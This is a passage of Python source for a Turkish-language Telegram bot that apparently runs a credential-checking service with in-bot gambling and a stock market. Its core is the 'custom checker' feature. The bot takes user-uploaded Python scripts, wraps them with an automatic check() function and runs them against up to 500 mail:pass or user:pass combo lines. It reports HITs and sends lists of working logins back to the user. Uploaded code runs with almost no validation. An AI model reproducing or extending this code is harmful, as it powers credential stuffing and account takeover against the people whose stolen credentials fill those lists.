  """Günlük giriş serisini günceller, ödül verir."""
  today = datetime.now().strftime("%Y-%m-%d")
  yesterday = (datetime.now() - timedelta(days=1)).strftime("%Y-%m-%d")
  data = login_streaks.get(user_id, {"last_date": None, "count": 0})
  if data.get("last_date") == today:
    return data.get("count", 0), 0.0  # bugün zaten işlendi
  if data.get("last_date") == yesterday:
    data["count"] = data.get("count", 0) + 1
  else:
    data["count"] = 1
  data["last_date"] = today
  login_streaks[user_id] = data
  streak = data["count"]
  reward = 0.0
  if streak == 3:
    reward = 3.0
    grant_achievement(user_id, "streak_3")
  elif streak == 7:
    reward = 10.0
    grant_achievement(user_id, "streak_7")
  elif streak == 14:
    reward = 25.0
    grant_achievement(user_id, "streak_14")
  elif streak > 0 and streak % 7 == 0 and streak not in (7, 14):
    reward = 5.0
  if reward > 0:
    user_balances[user_id] = user_balances.get(user_id, 0.0) + reward
    add_balance_history(user_id, "streak", reward, f"{streak} gün")
    add_notification(user_id, f"🔥 {streak} gün seri! +{reward:.0f} TL")
  grant_achievement(user_id, "first_login")
  save_data()
  return streak, reward

def grant_achievement(user_id, ach_id):
  if ach_id not in ACHIEVEMENTS:
    return False
  owned = user_achievements.get(user_id, [])
  if ach_id in owned:
    return False
  owned.append(ach_id)
  user_achievements[user_id] = owned
  info = ACHIEVEMENTS[ach_id]
  reward = float(info.get("reward", 0))
  xp = int(info.get("xp", 0))
  if reward > 0:
    user_balances[user_id] = user_balances.get(user_id, 0.0) + reward
    add_balance_history(user_id, "achievement", reward, ach_id)
  if xp > 0:
    add_xp(user_id, xp)
  add_notification(user_id, f"🏅 Başarım: {info['name']} (+{reward:.0f} TL)")
  try:
    bot.send_message(
      user_id,
      f"🏅 **Yeni Başarım!**\n\n**{info['name']}**\n{info['desc']}\n💵 +{reward:.0f} TL | ✨ +{xp} XP",
      parse_mode="Markdown"
    )
  except:
    pass
  save_data()
  return True

def check_ref_achievements(user_id):
  """Davet eden kişi için ref başarımlarını kontrol et."""
  count = sum(1 for v in user_referrers.values() if v == user_id)
  if count >= 10:
    grant_achievement(user_id, "ref_10")
  elif count >= 3:
    grant_achievement(user_id, "ref_3")

def get_referral_leaderboard(n=10):
  counts = {}
  for invited, inviter in user_referrers.items():
    counts[inviter] = counts.get(inviter, 0) + 1
  return sorted(counts.items(), key=lambda x: x[1], reverse=True)[:n]

def normalize_coupon(code):
  return str(code).strip().upper()

def find_coupon_key(code):
  code = normalize_coupon(code)
  for k in coupons.keys():
    if normalize_coupon(k) == code:
      return k
  return None

def coupon_is_valid(cdata, user_id):
  if not isinstance(cdata, dict):
    return False, "Geçersiz kupon verisi"
  if cdata.get("used_count", 0) >= cdata.get("max_uses", 1):
    return False, "Kupon kullanım limiti dolmuş"
  exp = cdata.get("expires_at")
  if exp:
    try:
      if datetime.now().strftime("%Y-%m-%d") > exp:
        return False, "Kuponun süresi dolmuş"
    except:
      pass
  min_lvl = int(cdata.get("min_level", 1))
  if user_level.get(user_id, 1) < min_lvl:
    return False, f"Minimum level: {min_lvl}"
  return True, "ok"


def push_notification(user_id, text_msg, important=False):
  """Kullanıcı bildirim kuyruğu + anlık mesaj."""
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  add_notification(uid, text_msg)
  try:
    prefix = "🔔 " if not important else "📢 "
    bot.send_message(uid, f"{prefix}{text_msg}"[:4000], parse_mode="Markdown")
  except Exception:
    try:
      bot.send_message(uid, f"{prefix}{str(text_msg).replace('*','').replace('`','')}"[:4000])
    except Exception:
      pass

def add_gamble_history(user_id, game, bet, result, delta):
  global gamble_history
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  gamble_history.setdefault(uid, []).append({
    "game": str(game)[:30],
    "bet": float(bet or 0),
    "result": str(result)[:40],
    "delta": float(delta or 0),
    "time": get_current_time_str(),
  })
  gamble_history[uid] = gamble_history[uid][-40:]

def get_gamble_history(user_id, limit=15):
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  return list(gamble_history.get(uid) or gamble_history.get(str(uid)) or [])[-limit:]

def filter_balance_history(user_id, kind="all", limit=20):
  """kind: all | market | gamble | admin | other"""
  hist = get_user_balance_history(user_id, limit=80)
  kind = (kind or "all").lower()
  if kind == "all":
    return hist[-limit:]
  out = []
  for h in hist:
    t = str(h.get("type") or "").lower()
    if kind == "market" and ("market" in t or "ilan" in t or "vip" in t):
      out.append(h)
    elif kind == "gamble" and any(x in t for x in ("gamble", "slot", "mine", "jackpot", "wheel", "pvp", "box", "convert")):
      out.append(h)
    elif kind == "admin" and ("admin" in t or "coupon" in t or "bonus" in t or "ref" in t):
      out.append(h)
    elif kind == "other" and not any(x in t for x in ("market", "ilan", "vip", "gamble", "slot", "mine", "jackpot", "admin")):
      out.append(h)
  return out[-limit:]

def market_daily_limit_for(user_id):
  """Abone: günde max 100 · abonesiz: MAX_MARKET_DAILY_QTY."""
  if has_checker_sub(user_id):
    return int(globals().get("MAX_MARKET_DAILY_QTY_SUB", 100) or 100)
  return int(MAX_MARKET_DAILY_QTY)

def market_daily_remaining(user_id):
  today = datetime.now().strftime("%Y-%m-%d")
  data = market_daily_buys.get(int(user_id) if str(user_id).isdigit() else user_id) or {}
  lim = market_daily_limit_for(user_id)
  if data.get("date") != today:
    return int(lim)
  used = int(data.get("qty") or 0)
  return max(0, int(lim) - used)

def market_daily_add(user_id, qty):
  global market_daily_buys
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  today = datetime.now().strftime("%Y-%m-%d")
  data = market_daily_buys.get(uid) or {}
  if data.get("date") != today:
    data = {"date": today, "qty": 0}
  data["qty"] = int(data.get("qty") or 0) + int(qty)
  market_daily_buys[uid] = data

def check_stock_warn(stock_file, item_name=""):
  """Stok düşükse adminlere bir kez uyar (30 dk cooldown)."""
  try:
    n = len(get_stock_list(stock_file))
  except Exception:
    return
  if n >= int(MARKET_STOCK_WARN):
    return
  now = time.time()
  last = float(stock_warn_sent.get(stock_file) or 0)
  if now - last < 1800:
    return
  stock_warn_sent[stock_file] = now
  msg = f"⚠️ **Stok uyarısı**\n📦 {item_name or stock_file}\nKalan: **{n}** (eş {MARKET_STOCK_WARN})"
  for aid in list(admin_ids_set):
    try:
      bot.send_message(aid, msg, parse_mode="Markdown")
    except Exception:
      pass

def track_checker_pref(user_id, key):
  """Favori/son kullanılan checker listesi."""
  global checker_recent
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  key = str(key)[:40]
  recent = list(checker_recent.get(uid) or [])
  if key in recent:
    recent.remove(key)
  recent.insert(0, key)
  checker_recent[uid] = recent[:8]

def toggle_checker_favorite(user_id, key):
  global checker_favorites
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  key = str(key)[:40]
  fav = list(checker_favorites.get(uid) or [])
  if key in fav:
    fav.remove(key)
    checker_favorites[uid] = fav
    return False
  fav.insert(0, key)
  checker_favorites[uid] = fav[:5]
  return True

def daily_box_remaining_str(user_id):
  today = datetime.now().strftime("%Y-%m-%d")
  if daily_box_claims.get(user_id) == today:
    now = datetime.now()
    tomorrow = (now + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
    left = int((tomorrow - now).total_seconds())
    h, r = divmod(left, 3600)
    m, s = divmod(r, 60)
    return f"Yarın tekrar · kalan **{h}s {m}dk {s}sn**"
  return "Şimdi açabilirsin ✅"

def tournament_panel_text():
  top = get_tournament_top(10)
  lines = ["🏆 **Haftalık Kumar Turnuvası**\n"]
  if not top:
    lines.append("_Henüz sıralama yok — oyna!_")
  else:
    medals = ["🥇", "🥈", "🥉"]
    for i, (uid, profit) in enumerate(top):
      m = medals[i] if i < 3 else f"{i+1}."
      lines.append(f"{m} `{uid}` → **{float(profit):.2f} TL** net")
  lines.append(f"\n🎰 Jackpot havuzu: **{float(jackpot_pool):.2f} TL**")
  return "\n".join(lines)

def admin_daily_summary_text():
  n_users = len(registered_users)
  n_ban = len(banned_users) + len(hard_banned_users)
  total_bal = sum(float(v or 0) for v in user_balances.values())
  total_g = sum(float(v or 0) for v in user_gamble_balances.values())
  pending_wd = len(withdrawal_requests or {})
  tickets = len(active_tickets or {})
  pending_cc = len(custom_checkers_pending or {})
  return (
    f"📊 **Günlük özet**\n"
    f"👥 Kullanıcı: **{n_users}** · Ban: **{n_ban}**\n"
    f"💵 Toplam normal: **{total_bal:.0f} TL**\n"
    f"🎲 Toplam kumar: **{total_g:.0f} TL**\n"
    f"🎰 Jackpot: **{float(jackpot_pool):.2f} TL**\n"
    f"💸 Bekleyen çekim: **{pending_wd}**\n"
    f"🎫 Açık ticket: **{tickets}**\n"
    f"🐍 Onay bekleyen PY chk: **{pending_cc}**\n"
    f"🕐 {get_current_time_str()}"
  )

def admin_summary_loop():
  """Her gün BACKUP_HOUR+1 civarı admin özeti."""
  while bot_running:
    try:
      now = datetime.now()
      target_h = (int(BACKUP_HOUR) + 1) % 24
      if now.hour == target_h and now.minute < 3:
        msg = admin_daily_summary_text()
        for aid in list(admin_ids_set):
          try:
            bot.send_message(aid, msg, parse_mode="Markdown")
          except Exception:
            pass
        time.sleep(180)
      time.sleep(60)
    except Exception as e:
      log_error("admin_summary_loop", e)
      time.sleep(120)

def referral_fraud_score(user_id):
  """Basit anti-abuse skoru (0-100). Yüksek = şüpheli."""
  score = 0
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  week = int(referral_week_stats.get(uid) or 0)
  if week >= 20:
    score += 40
  elif week >= 10:
    score += 25
  elif week >= 5:
    score += 10
  fp = user_fingerprints.get(uid) or {}
  devices = fp.get("devices") or []
  if isinstance(devices, (list, set)) and len(devices) >= 4:
    score += 20
  if float(user_balances.get(uid) or 0) < 1 and week >= 8:
    score += 15
  return min(100, score)

def _ensure_custom_chk_dir():
  try:
    os.makedirs(CUSTOM_CHK_DIR, exist_ok=True)
  except Exception:
    pass

def _custom_chk_validate_source(src: str):
  """Sadece temel kontrol — yasaklı ifade yok, admin inceler."""
  if not src or len(src.strip()) < 10:
    return False, "Dosya çok kısa / boş"
  if len(src) > 500_000:
    return False, "Dosya çok büyük (max ~500KB)"
  return True, "ok"

def _run_custom_check_once(file_path, user, password, timeout=45):
  """Checker satiri: once import+check, olmazsa python dosya.py login pass."""
  import subprocess as _sp
  import json as _json
  import tempfile
  fp = os.path.abspath(file_path)
  if not os.path.isfile(fp):
    return False, "ERROR", "dosya yok: " + fp

  def _parse_hit_text(t):
    low = str(t or "").lower()
    if not low.strip():
      return None
    if any(k in low for k in (
      "[hit]", " hit", "hit:", "success", "live", "valid", "good", "aktif",
      "basarili", "başarılı", "dogru", "doğru", "logged", "login ok", "giris basarili",
      "giriş başarılı", "account live", "working", "approved",
    )):
      return True
    if any(k in low for k in (
      "[bad]", " bad", "bad:", "fail", "dead", "invalid", "wrong password", "incorrect",
      "hatali", "hatalı", "yanlis", "yanlış", "basarisiz", "başarısız", "rejected",
    )):
      return False
    s = low.strip()
    if s in ("hit", "success", "live", "ok", "true", "1", "yes"):
      return True
    if s in ("bad", "fail", "dead", "false", "0", "no"):
      return False
    return None

  env = dict(os.environ)
  env["PYTHONIOENCODING"] = "utf-8"
  env["PYTHONDONTWRITEBYTECODE"] = "1"
  cwd = os.path.dirname(fp) or None
  login = str(user)
  passwd = str(password)


  runner_src = (
    "import importlib.util, json, sys, inspect, io, contextlib, traceback, types\n"
    "fp, login, password = sys.argv[1], sys.argv[2], sys.argv[3]\n"
    "def emit(ok, status, detail=''):\n"
    "    sys.stdout.write('__CCHK_RESULT__' + json.dumps({'ok': bool(ok), 'status': str(status)[:80], 'detail': str(detail)[:500]}, ensure_ascii=False) + '\\n')\n"
    "# --- Eksik süs modüllerini (cfonts vb.) otomatik stubla ---\n"
    "class _Stub:\n"
    "    def __init__(self, *a, **k): pass\n"
    "    def __call__(self, *a, **k): return ''\n"
    "    def __getattr__(self, n): return _Stub()\n"
    "    def __str__(self): return ''\n"
    "    def __iter__(self): return iter(())\n"
    "    def __bool__(self): return False\n"
    "def _install_stub(name):\n"
    "    if name in sys.modules: return sys.modules[name]\n"
    "    m = types.ModuleType(name)\n"
    "    m.__file__ = '<cchk_stub>'\n"
    "    m.__dict__['render'] = _Stub()\n"
    "    m.__dict__['say'] = _Stub()\n"
    "    m.__dict__['print'] = _Stub()\n"
    "    m.__dict__['cprint'] = _Stub()\n"
    "    m.__dict__['colored'] = _Stub()\n"
    "    m.__dict__['Fore'] = _Stub()\n"
    "    m.__dict__['Back'] = _Stub()\n"
    "    m.__dict__['Style'] = _Stub()\n"
    "    m.__dict__['init'] = _Stub()\n"
    "    m.__dict__['Figlet'] = _Stub()\n"
    "    def _getattr(n):\n"
    "        return _Stub()\n"
    "    m.__getattr__ = lambda n: _Stub()\n"
    "    sys.modules[name] = m\n"
    "    # alt paketler: cfonts.core vb.\n"
    "    return m\n"
    "_DECOR = {\n"
    "    'cfonts','python_cfonts','pyfiglet','termcolor','colorama','colored',\n"
    "    'rich','blessings','sty','pastel','ascii_magic','art','cprint',\n"
    "    'tabulate','prettytable','yaspin','tqdm','halo','spinners',\n"
    "}\n"
    "for _n in list(_DECOR):\n"
    "    try:\n"
    "        __import__(_n)\n"
    "    except Exception:\n"
    "        _install_stub(_n)\n"
    "class _CchkFinder:\n"
    "    def find_module(self, fullname, path=None):\n"
    "        root = (fullname or '').split('.')[0]\n"
    "        if root in _DECOR or fullname in _DECOR:\n"
    "            return self\n"
    "        return None\n"
    "    def load_module(self, fullname):\n"
    "        if fullname in sys.modules:\n"
    "            return sys.modules[fullname]\n"
    "        root = fullname.split('.')[0]\n"
    "        if root not in sys.modules:\n"
    "            _install_stub(root)\n"
    "        # nested: a.b -> stub a.b too\n"
    "        parts = fullname.split('.')\n"
    "        for i in range(1, len(parts)+1):\n"
    "            sub = '.'.join(parts[:i])\n"
    "            if sub not in sys.modules:\n"
    "                _install_stub(sub)\n"
    "        return sys.modules[fullname]\n"
    "sys.meta_path.insert(0, _CchkFinder())\n"
    "def find_fn(mod):\n"
    "    names = ('check','check_account','checker','run','main_check','login','verify','validate','test','test_account','chk','do_check','process','start','main')\n"
    "    for n in names:\n"
    "        fn = getattr(mod, n, None)\n"
    "        if callable(fn) and not inspect.isclass(fn):\n"
    "            return fn, n\n"
    "    cands = []\n"
    "    for n, obj in vars(mod).items():\n"
    "        if n.startswith('_') or not callable(obj) or inspect.isclass(obj):\n"
    "            continue\n"
    "        cands.append(n)\n"
    "    prefer = [n for n in cands if any(k in n.lower() for k in ('check','login','verif','test','run','auth'))]\n"
    "    for n in prefer + cands:\n"
    "        return getattr(mod, n), n\n"
    "    return None, None\n"
    "try:\n"
    "    spec = importlib.util.spec_from_file_location('user_chk_mod', fp)\n"
    "    mod = importlib.util.module_from_spec(spec)\n"
    "    mod.__name__ = 'user_chk_mod'\n"
    "    buf_imp = io.StringIO()\n"
    "    try:\n"
    "        with contextlib.redirect_stdout(buf_imp), contextlib.redirect_stderr(buf_imp):\n"
    "            spec.loader.exec_module(mod)\n"
    "    except ModuleNotFoundError as me:\n"
    "        miss = getattr(me, 'name', None) or str(me)\n"
    "        root = str(miss).split('.')[0].replace(\"No module named\", \"\").strip(\" '\\\")\n"
    "        if root:\n"
    "            _install_stub(root)\n"
    "            _DECOR.add(root)\n"
    "            try:\n"
    "                with contextlib.redirect_stdout(buf_imp), contextlib.redirect_stderr(buf_imp):\n"
    "                    spec.loader.exec_module(mod)\n"
    "            except Exception as e2:\n"
    "                emit(False, 'ERROR', 'import: %s (eksik paket: %s — pip install deneyin)' % (e2, root))\n"
    "                raise SystemExit(0)\n"
    "        else:\n"
    "            emit(False, 'ERROR', 'import: %s' % me)\n"
    "            raise SystemExit(0)\n"
    "    except Exception as e:\n"
    "        emit(False, 'ERROR', 'import: %s: %s' % (type(e).__name__, e))\n"
    "        raise SystemExit(0)\n"
    "    fn, found = find_fn(mod)\n"
    "    if not callable(fn):\n"
    "        emit(False, 'NO_CHECK', 'fonksiyon yok (check/login/run tanimla)')\n"
    "        raise SystemExit(0)\n"
    "    buf = io.StringIO()\n"
    "    err = None\n"
    "    r = None\n"
    "    with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(buf):\n"
    "        try:\n"
    "            r = fn(login, password)\n"
    "        except TypeError:\n"
    "            try:\n"
    "                r = fn(login + ':' + password)\n"
    "            except Exception:\n"
    "                try:\n"
    "                    r = fn(login)\n"
    "                except Exception as e2:\n"
    "                    err = e2\n"
    "        except Exception as e:\n"
    "            err = e\n"
    "    printed = buf.getvalue()\n"
    "    if err is not None:\n"
    "        emit(False, 'ERROR', '%s: %s | %s' % (found, err, printed[:120]))\n"
    "        raise SystemExit(0)\n"
    "    text = (str(r) if r is not None else '') + '\\n' + printed\n"
    "    low = text.lower()\n"
    "    if r is True or r == 1:\n"
    "        emit(True, 'HIT', printed[:200]); raise SystemExit(0)\n"
    "    if isinstance(r, (list, tuple)) and len(r) >= 1 and r[0]:\n"
    "        emit(True, 'HIT', str(r)[:200]); raise SystemExit(0)\n"
    "    if isinstance(r, dict) and (r.get('ok') or r.get('hit') or r.get('success')):\n"
    "        emit(True, 'HIT', str(r)[:200]); raise SystemExit(0)\n"
    "    if any(x in low for x in ('[hit]', ' hit', 'success', 'live', 'valid')):\n"
    "        emit(True, 'HIT', (printed or str(r) or '')[:200]); raise SystemExit(0)\n"
    "    if r is False or r == 0 or any(x in low for x in ('[bad]', 'fail', 'dead', 'invalid')):\n"
    "        emit(False, 'BAD', (printed or str(r) or '')[:200]); raise SystemExit(0)\n"
    "    emit(False, 'BAD', (printed or str(r) or 'belirsiz')[:200])\n"
    "except SystemExit:\n"
    "    raise\n"
    "except Exception as e:\n"
    "    emit(False, 'ERROR', '%s: %s' % (type(e).__name__, e))\n"
  )

  import_err = ""
  try:
    with tempfile.NamedTemporaryFile("w", suffix="_cchk_runner.py", delete=False, encoding="utf-8") as tf:
      tf.write(runner_src)
      runner_path = tf.name
    try:
      p = _sp.run(
        [sys.executable, runner_path, fp, login, passwd],
        capture_output=True, text=True, timeout=timeout, cwd=cwd, env=env,
      )
    finally:
      try:
        os.remove(runner_path)
      except Exception:
        pass
    out = (p.stdout or "") + "\n" + (p.stderr or "")
    data = None
    for line in out.splitlines():
      if line.startswith("__CCHK_RESULT__"):
        try:
          data = _json.loads(line[len("__CCHK_RESULT__"):])
        except Exception:
          pass
    if data:
      st = str(data.get("status") or "")
      det = str(data.get("detail") or "")
      if st == "HIT" or (data.get("ok") and st not in ("ERROR", "NO_CHECK", "TIMEOUT")):
        return True, "HIT", det
      if st == "BAD":
        return False, "BAD", det
      if st not in ("NO_CHECK", "ERROR"):
        return bool(data.get("ok")), st, det
      import_err = det or st
    else:
      import_err = (p.stderr or p.stdout or "no result")[:250]
  except _sp.TimeoutExpired:
    return False, "TIMEOUT", str(timeout) + "s"
  except Exception as e:
    import_err = str(e)[:200]

  try:
    boot = (
      "import sys,types\n"
      "class _S:\n"
      "    def __init__(self,*a,**k): pass\n"
      "    def __call__(self,*a,**k): return ''\n"
      "    def __getattr__(self,n): return _S()\n"
      "    def __str__(self): return ''\n"
      "def _stub(n):\n"
      "    if n in sys.modules: return\n"
      "    m=types.ModuleType(n); m.render=m.say=m.print=m.cprint=m.colored=_S(); m.init=_S(); m.Figlet=_S(); m.__getattr__=lambda x: _S(); sys.modules[n]=m\n"
      "for n in ('cfonts','python_cfonts','pyfiglet','termcolor','colorama','colored','rich','art','yaspin','tqdm','tabulate'):\n"
      "    try:\n"
      "        __import__(n)\n"
      "    except Exception:\n"
      "        _stub(n)\n"
      "import runpy\n"
      "sys.argv=[sys.argv[1], sys.argv[2], sys.argv[3]]\n"
      "runpy.run_path(sys.argv[0], run_name='__main__')\n"
    )
    with tempfile.NamedTemporaryFile("w", suffix="_cchk_boot.py", delete=False, encoding="utf-8") as bf:
      bf.write(
        "import sys,types\n"
        "class _S:\n"
        "    def __init__(self,*a,**k): pass\n"
        "    def __call__(self,*a,**k): return ''\n"
        "    def __getattr__(self,n): return _S()\n"
        "    def __str__(self): return ''\n"
        "def _stub(n):\n"
        "    if n in sys.modules: return\n"
        "    m=types.ModuleType(n)\n"
        "    m.render=m.say=m.print=m.cprint=m.colored=_S()\n"
        "    m.init=_S(); m.Figlet=_S()\n"
        "    m.__getattr__=lambda x: _S()\n"
        "    sys.modules[n]=m\n"
        "for n in ('cfonts','python_cfonts','pyfiglet','termcolor','colorama','colored','rich','art','yaspin','tqdm','tabulate'):\n"
        "    try:\n"
        "        __import__(n)\n"
        "    except Exception:\n"
        "        _stub(n)\n"
        "import runpy\n"
        "fp,a,b=sys.argv[1],sys.argv[2],sys.argv[3]\n"
        "sys.argv=[fp,a,b]\n"
        "runpy.run_path(fp, run_name='__main__')\n"
      )
      boot_path = bf.name
    try:
      p2 = _sp.run(
        [sys.executable, '-u', boot_path, fp, login, passwd],
        capture_output=True, text=True, timeout=timeout, cwd=cwd, env=env,
      )
    finally:
      try:
        os.remove(boot_path)
      except Exception:
        pass
    out2 = ((p2.stdout or "") + "\n" + (p2.stderr or "")).strip()
    h = _parse_hit_text(out2)
    if h is True:
      return True, "HIT", out2[:200]
    if h is False:
      return False, "BAD", out2[:200]
    if p2.returncode == 0 and out2 and any(x in out2.lower() for x in ("hit", "success", "live")):
      return True, "HIT", out2[:200]
    if p2.returncode == 0 and out2:
      return False, "BAD", out2[:200]
    return False, "ERROR", ("A: " + import_err + " | B: " + out2)[:300]
  except _sp.TimeoutExpired:
    return False, "TIMEOUT", str(timeout) + "s"
  except Exception as e:
    return False, "ERROR", ("A: " + import_err + " | B: " + str(e))[:300]

def run_custom_checker_job(chat_id, user_id, cid, combo_text, private_only=False):
  """Combo satırlarını özel checker ile tara."""
  global active_custom_chk_jobs
  meta = custom_checkers.get(cid) if not private_only else (
    custom_checkers.get(cid) or custom_checkers_pending.get(cid)
  )
  if not meta:
    bot.send_message(chat_id, "❌ Checker bulunamadı.")
    return
  if private_only and int(meta.get("author_id") or 0) != int(user_id) and user_id not in admin_ids_set:
    bot.send_message(chat_id, "❌ Bu checker sana ait değil.")
    return
  fp = meta.get("file")
  if fp:
    fp = os.path.abspath(fp)
    if not os.path.isfile(fp):
      alt = os.path.abspath(os.path.join(CUSTOM_CHK_DIR, os.path.basename(str(meta.get("file")))))
      if os.path.isfile(alt):
        fp = alt
  if not fp or not os.path.isfile(fp):
    bot.send_message(chat_id, f"❌ Checker dosyası yok.\n`{meta.get('file')}`", parse_mode="Markdown")
    return
  if user_id in active_custom_chk_jobs and not active_custom_chk_jobs[user_id].get("stop"):
    bot.send_message(chat_id, "⚠️ Zaten bir tarama var.")
    return
  parsed = _parse_combo_lines(combo_text or "")
  lines = [(u, p, f"{u}:{p}") for u, p in parsed]
  if not lines:
    bot.send_message(
      chat_id,
      "❌ Geçerli combo satırı yok.\n"
      "Format: `mail:pass` · `user:pass` · `login|sifre` · `;` / `,` da olur",
      parse_mode="Markdown",
    )
    return
  lines = lines[:500]
  job = {"stop": False, "total": len(lines), "checked": 0, "hits": 0, "bads": 0, "errors": 0}
  active_custom_chk_jobs[user_id] = job
  name = meta.get("name") or cid
  track_checker_pref(user_id, f"custom_{cid}")
  try:
    track_checker_use(user_id, 1)
  except Exception:
    pass
  fp = os.path.abspath(fp)
  if not os.path.isfile(fp):
    bot.send_message(chat_id, f"❌ Checker dosyası bulunamadı:\n`{fp}`", parse_mode="Markdown")
    active_custom_chk_jobs.pop(user_id, None)
    return
  msg = bot.send_message(chat_id, f"🐍 **{name}** — {len(lines)} satır taranıyor...\n📁 `{os.path.basename(fp)}`", parse_mode="Markdown")
  hits = []
  err_samples = []
  for i, (u, p, raw) in enumerate(lines, 1):
    if active_custom_chk_jobs.get(user_id, {}).get("stop"):
      break
    ok, status, detail = _run_custom_check_once(fp, u, p)
    job["checked"] = i
    st_up = str(status or "").strip().upper()
    detail_l = str(detail or "").lower()
    if i == 1:
      try:
        bot.send_message(
          chat_id,
          "🔍 **İlk satır ham sonuç**\n"
          f"`{raw[:80]}`\n"
          f"status: `{status}`\n"
          f"ok: `{ok}`\n"
          f"detay:\n```\n{str(detail)[:800]}\n```",
          parse_mode="Markdown",
        )
      except Exception:
        try:
          bot.send_message(chat_id, f"Ilk satir: status={status} ok={ok} detay={str(detail)[:500]}")
        except Exception:
          pass
    is_hit = bool(ok) or st_up in (
      "HIT", "SUCCESS", "LIVE", "VALID", "OK", "TRUE", "1", "GOOD", "YES"
    ) or any(x in detail_l for x in (
      "[hit]", " hit", "success", "live account", "valid", "basarili", "başarılı",
      "dogru", "doğru", "logged", "working",
    ))
    is_err = st_up in ("ERROR", "TIMEOUT", "EMPTY", "NO_CHECK") or st_up.startswith("ERR")
    if is_hit and not is_err:
      job["hits"] += 1
      hits.append(f"{raw}" + (f" | {status}" if status else "") + (f" | {detail}" if detail else ""))
    elif is_err:
      job["errors"] += 1
      if len(err_samples) < 5:
        err_samples.append(f"{raw[:40]} → [{status}] {str(detail)[:120]}")
    else:
      job["bads"] += 1
    if i % 5 == 0 or i == len(lines):
      try:
        bot.edit_message_text(
          f"🐍 **{name}**\n✅ {job['hits']} · ❌ {job['bads']} · ⚠️ {job['errors']}\n"
          f"📊 {job['checked']}/{job['total']}",
          chat_id, msg.message_id, parse_mode="Markdown",
        )
      except Exception:
        pass
    time.sleep(0.15)
  active_custom_chk_jobs.pop(user_id, None)
  if cid in custom_checkers:
    custom_checkers[cid]["uses"] = int(custom_checkers[cid].get("uses") or 0) + 1
    try:
      save_data()
    except Exception:
      pass
  summary = (
    f"🐍 **{name} sonuç**\n"
    f"✅ HIT: **{job['hits']}** · ❌ BAD: **{job['bads']}** · ⚠️ ERR: **{job['errors']}**\n"
    f"📊 {job['checked']}/{job['total']}"
  )
  if err_samples:
    summary += "\n\n⚠️ **Örnek hatalar:**\n" + "\n".join(f"• `{e}`" for e in err_samples)
    summary += "\n\n_İpucu: `def check(login, password)` olmalı; requests vs. bot sunucusunda yüklü olmalı._"
  bot.send_message(chat_id, summary[:4000], parse_mode="Markdown")
  if hits:
    body = "\n".join(hits)
    if len(body) < 3500:
      bot.send_message(chat_id, f"✅ HIT listesi:\n```text\n{body}\n```", parse_mode="Markdown")
    else:
      tmp = f"custom_hit_{user_id}_{cid}.txt"
      try:
        with open(tmp, "w", encoding="utf-8") as f:
          f.write(body + "\n")
        with open(tmp, "rb") as doc:
          bot.send_document(chat_id, doc, caption=f"🐍 {name} HITs")
      finally:
        try:
          os.remove(tmp)
        except Exception:
          pass

def _auto_wrap_checker_source(src):
  """check() yoksa dosya sonuna otomatik sarmalayici ekle."""
  if not src:
    return src
  if re.search(r"^\s*def\s+check\s*\(", src, flags=re.M):
    return src
  wrap_lines = [
    "",
    "# === BOT OTOMATIK check() — silme ===",
    "def check(login, password):",
    "    import inspect as _inspect",
    "    _g = dict(globals())",
    "    _cands = []",
    "    for _n, _obj in _g.items():",
    "        if _n.startswith('_') or _n == 'check':",
    "            continue",
    "        if not callable(_obj):",
    "            continue",
    "        try:",
    "            if _inspect.isclass(_obj) or _inspect.ismodule(_obj):",
    "                continue",
    "        except Exception:",
    "            pass",
    "        _cands.append((_n, _obj))",
    "    def _sc(_n):",
    "        _l = _n.lower()",
    "        for i, k in enumerate(('check', 'login', 'verif', 'valid', 'test', 'run', 'account', 'auth')):",
    "            if k in _l:",
    "                return i",
    "        return 50",
    "    _cands.sort(key=lambda x: (_sc(x[0]), x[0]))",
    "    for _n, _fn in _cands:",
    "        for _args in ((login, password), (login + ':' + password,), (login,)):",
    "            try:",
    "                _r = _fn(*_args)",
    "            except TypeError:",
    "                continue",
    "            except Exception as _e:",
    "                continue",
    "            if isinstance(_r, tuple) and len(_r) >= 1:",
    "                _ok = bool(_r[0])",
    "                _st = str(_r[1]) if len(_r) > 1 else ('HIT' if _ok else 'BAD')",
    "                _dt = str(_r[2]) if len(_r) > 2 else ''",
    "                return _ok, _st, _dt",
    "            if isinstance(_r, bool):",
    "                return _r, ('HIT' if _r else 'BAD'), ''",
    "            if isinstance(_r, dict):",
    "                _ok = bool(_r.get('ok') or _r.get('hit') or _r.get('success'))",
    "                return _ok, str(_r.get('status') or ('HIT' if _ok else 'BAD')), str(_r.get('detail') or '')[:200]",
    "            if isinstance(_r, str):",
    "                _low = _r.lower()",
    "                _ok = any(x in _low for x in ('hit', 'success', 'ok', 'true', 'live', 'valid'))",
    "                return _ok, ('HIT' if _ok else 'BAD'), _r[:200]",
    "            if _r is None:",
    "                continue",
    "            return bool(_r), ('HIT' if _r else 'BAD'), str(_r)[:100]",
    "    _names = ', '.join(_n for _n, _ in _cands[:15]) or 'yok'",
    "    return False, 'NO_CHECK', 'Uygun fn yok: ' + _names",
    "",
  ]
  return src.rstrip() + "\n" + "\n".join(wrap_lines) + "\n"

def submit_custom_checker(user_id, username, file_bytes, filename, display_name=None, desc=""):
  try:
    src = file_bytes.decode("utf-8", errors="ignore")
  except Exception:
    return False, "Dosya okunamadı"
  ok, reason = _custom_chk_validate_source(src)
  if not ok:
    return False, reason
  try:
    src = _auto_wrap_checker_source(src)
  except Exception as e:
    log_error("auto_wrap_chk", e)
  cid = str(uuid.uuid4())[:8]
  safe_name = "".join(c for c in (display_name or filename or "chk") if c.isalnum() or c in " _-")[:32] or cid
  _ensure_custom_chk_dir()
  fp = os.path.abspath(os.path.join(CUSTOM_CHK_DIR, f"{cid}.py"))
  with open(fp, "w", encoding="utf-8") as f:
    f.write(src)
  custom_checkers_pending[cid] = {
    "name": safe_name,
    "author_id": int(user_id),
    "username": username or "",
    "file": fp,
    "desc": (desc or "")[:200],
    "time": get_current_time_str(),
    "filename": filename or f"{cid}.py",
  }
  try:
    save_data()
  except Exception as e:
    log_error("cchk_save", e)
  def _notify_admins():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
